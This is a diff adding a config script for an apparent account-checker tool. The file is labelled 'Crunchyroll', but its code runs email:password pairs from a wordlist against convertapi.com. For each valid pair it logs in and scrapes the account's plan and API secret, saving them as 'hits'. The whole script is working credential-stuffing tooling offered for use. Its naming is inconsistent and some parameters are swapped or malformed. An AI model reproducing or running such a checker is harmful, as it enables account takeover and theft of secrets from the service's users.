@@ -1,0 +1,78 @@
+[IrSettings]
+{
+  "Name": "CrunchyrollApi",
+  "Author": "AkashPattnaik",
+  "AdditionalInfo": "Join @IndianBots For More",
+  "IrVersion": "4.0.1 [Release]",
+  "ConfigVersion": "0.0.1+beta",
+  "AllowedWordlist": "MailPass",
+  "HitsFileName": "Crunchyroll",
+  "SaveHits": "True"
+}
+
+
+[IrScript]
+# This Is A Comment
+"""
+This Is Python DocString,
+A MultiLine Comment If Required Else A Explanation For Functions And Classes
+"""
+req = requestGet(
+    url=f"https://www.convertapi.com/a/VerifyEmailAndPassword?Password=$LOGIN&Email=$SECRET",
+    headers={
+        "Host": "www.convertapi.com",
+        "User-Agent": "Mozilla/5.0 (Windows Mankind 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br",
+        "X-Requested-With": "XMLHttpRequest",
+        "Connection": "keep-alive",
+        "Referer": "https://www.convertapi.com/",
+    }
+)
+
+# Check If There Is A Response Or Not,
+# When Disconnected From Internet, Returns False.
+if req:
+    if "Email or password is incorrect" in req.text:
+        self.checked.append("$LOGIN:$SECRET")
+        self.failed.append("$LOGIN:$SECRET")
+        pass
+    if "true" in req.text:
+        # You Can Always Set Same Variables, Only After Previous Action Is Completed
+        req = requestPost(
+            url='https://www.convertapi.com/a/login',
+            content=URLEncode(f"Email=$LOGIN&Password=$SECRET&ReturnUrl="),
+            headers={
+                "Host": "www.convertapi.com",
+                "User-Agent": "Mozilla/5.0 (Windows Mankind 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Content-Length": f"{Length(URLEncode(f'Email=$LOGIN>&Password=$SECRET&ReturnUrl='))}",
+                "Origin": "https://www.convertapi.com",
+                "Connection": "keep-alive",
+                "Referer": "https://www.convertapi.com/",
+                "Upgrade-Insecure-Requests": "1",
+            },
+        )
+        # BeautifulSoup Is Added For Parsing The Request Return Data
+        if req:
+            soup = BeautifulSoup(req.text, 'html.parser')
+            Plan = soup.find('h3').text
+            AccountSecret = soup.find('', attrs={
+                "id": "user-secret",
+                "class": "form-control",
+            })
+            Progress = soup.find('label')
+            # Saving Hits In A Custom File
+            HitSaver(
+                fileName="Crunchyroll",
+                hit=f"$LOGIN:$SECRET",
+                extraContent=f"Plan - {Plan}  AccountSecret - {AccountSecret}  Progress - {Progress}",
+            )
+            self.checked.append("$LOGIN:$SECRET")
+            self.hits.append("$LOGIN:$SECRET")
+else:
+    self.checked.append("$LOGIN:$SECRET")
+    self.failed.append("$LOGIN:$SECRET")
